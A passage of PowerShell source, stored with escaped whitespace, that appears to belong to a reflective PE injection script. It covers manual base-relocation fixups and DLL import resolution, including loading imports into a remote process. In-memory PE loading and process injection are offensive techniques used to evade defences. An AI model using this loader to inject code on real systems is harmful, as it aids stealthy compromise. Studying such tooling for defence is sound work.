\u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Int64]$BaseDifference = 0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$AddDifference = $true #Track if the difference variable should be added or subtracted from variables\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[UInt32]$ImageBaseRelocSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_BASE_RELOCATION)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#If the PE was loaded to its expected address or there are no entries in the BaseRelocationTable, nothing to do\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if (($OriginalImageBase -eq [Int64]$PEInfo.EffectivePEHandle) `\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0-or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0return\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0elseif ((Compare-Val1GreaterThanVal2AsUInt ($OriginalImageBase) ($PEInfo.EffectivePEHandle)) -eq $true)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$BaseDifference = Sub-SignedIntAsUnsigned ($OriginalImageBase) ($PEInfo.EffectivePEHandle)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$AddDifference = $false\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0elseif ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.EffectivePEHandle) ($OriginalImageBase)) -eq $true)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$BaseDifference = Sub-SignedIntAsUnsigned ($PEInfo.EffectivePEHandle) ($OriginalImageBase)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Use the IMAGE_BASE_RELOCATION structure to find memory addresses which need to be modified\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0while($true)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#If SizeOfBlock == 0, we are done\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$BaseRelocationTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($BaseRelocPtr, [Type]$Win32Types.IMAGE_BASE_RELOCATION)\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($BaseRelocationTable.SizeOfBlock -eq 0)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0break\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]$MemAddrBase = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$BaseRelocationTable.VirtualAddress))\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$NumRelocations = ($BaseRelocationTable.SizeOfBlock - $ImageBaseRelocSize) / 2\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Loop through each relocation\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0for($i = 0; $i -lt $NumRelocations; $i++)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Get info for this relocation\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$RelocationInfoPtr = [IntPtr](Add-SignedIntAsUnsigned ([IntPtr]$BaseRelocPtr) ([Int64]$ImageBaseRelocSize + (2 * $i)))\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[UInt16]$RelocationInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($RelocationInfoPtr, [Type][UInt16])\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#First 4 bits is the relocation type, last 12 bits is the address offset from $MemAddrBase\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[UInt16]$RelocOffset = $RelocationInfo -band 0x0FFF\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[UInt16]$RelocType = $RelocationInfo -band 0xF000\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0for ($j = 0; $j -lt 12; $j++)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$RelocType = [Math]::Floor($RelocType / 2)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#For DLL's there are two types of relocations used according to the following MSDN article. One for 64bit and one for 32bit.\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#This appears to be true for EXE's as well.\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0# \u00a0\u00a0\u00a0Site: http://msdn.microsoft.com/en-us/magazine/cc301808.aspx\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if (($RelocType -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0-or ($RelocType -eq $Win32Constants.IMAGE_REL_BASED_DIR64))\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{ \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Get the current memory address and update it based off the difference between PE expected base address and actual base address\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]$FinalAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$MemAddrBase) ([Int64]$RelocOffset))\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]$CurrAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FinalAddr, [Type][IntPtr])\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($AddDifference -eq $true)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]$CurrAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0else\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]$CurrAddr = [IntPtr](Sub-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0} \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[System.Runtime.InteropServices.Marshal]::StructureToPtr($CurrAddr, $FinalAddr, $false) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0elseif ($RelocType -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#IMAGE_REL_BASED_ABSOLUTE is just used for padding, we don't actually do anything with it\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Throw \"Unknown relocation found, relocation value: $RelocType, relocationinfo: $RelocationInfo\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$BaseRelocPtr) ([Int64]$BaseRelocationTable.SizeOfBlock))\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0}\n\n\n\t\t\t\u00a0\u00a0\u00a0Function Import-DllImports\n\t\t\t\u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Param(\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Parameter(Position = 0, Mandatory = $true)]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[System.Object]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$PEInfo,\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Parameter(Position = 1, Mandatory = $true)]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[System.Object]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Functions,\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Parameter(Position = 2, Mandatory = $true)]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[System.Object]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Types,\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Parameter(Position = 3, Mandatory = $true)]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[System.Object]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Constants,\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Parameter(Position = 4, Mandatory = $false)]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$RemoteProcHandle\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$RemoteLoading = $false\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($PEInfo.PEHandle -ne $PEInfo.EffectivePEHandle)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$RemoteLoading = $true\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0while ($true)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#If the structure is null, it signals that this is the end of the array\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($ImportDescriptor.Characteristics -eq 0 `\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0-and $ImportDescriptor.FirstThunk -eq 0 `\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0-and $ImportDescriptor.ForwarderChain -eq 0 `\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0-and $ImportDescriptor.Name -eq 0 `\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0-and $ImportDescriptor.TimeDateStamp -eq 0)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Write-Verbose \"Done importing DLL imports\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0break\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ImportDllHandle = [IntPtr]::Zero\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ImportDllPathPtr = (Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name))\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($RemoteLoading -eq $true)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ImportDllHandle = Import-DllInRemoteProcess -RemoteProcHandle $RemoteProcHandle -ImportDllPathPtr $ImportDllPathPtr\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0else\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ImportDllHandle = $Win32Functions.LoadLibrary.Invoke($ImportDllPath)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if (($ImportDllHandle -eq $null) -or ($ImportDllHandle -eq [IntPtr]::Zero))\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0throw \"Error importing DLL, DLLName: $ImportDllPath\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Get the first thunk, then loop through all of them\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]$ThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.FirstThunk)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.Characteristics) #Characteristics is overloaded with OriginalFirstThunk\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0while ($OriginalThunkRefVal -ne [IntPtr]::Zero)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$LoadByOrdinal = $false\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]$ProcedureNamePtr = [IntPtr]::Zero\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Compare thunkRefVal to IMAGE_ORDINAL_FLAG, which is defined as 0x80000000 or 0x8000000000000000 depending on 32bit or 64bit\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0# \u00a0\u00a0\u00a0If the top bit is set on an int, it will be negative, so instead of worrying about casting this to uint\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0# \u00a0\u00a0\u00a0and doing the comparison, just see if it is less than 0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]$NewThunkRef = [IntPtr]::Zero\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4 -and [Int32]$OriginalThunkRefVal -lt 0)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]$ProcedureNamePtr = [IntPtr]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$LoadByOrdinal = $true\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0elseif([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8 -and [Int64]$OriginalThunkRefVal -lt 0)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]$ProcedureNamePtr = [Int64]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$LoadByOrdinal = $true\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0else\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]$StringAddr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($OriginalThunkRefVal)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$StringAddr = Add-SignedIntAsUnsigned $StringAddr ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ProcedureName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($StringAddr)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ProcedureNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ProcedureName)\n\t\t\t\u00a0\u00a0\u00a0 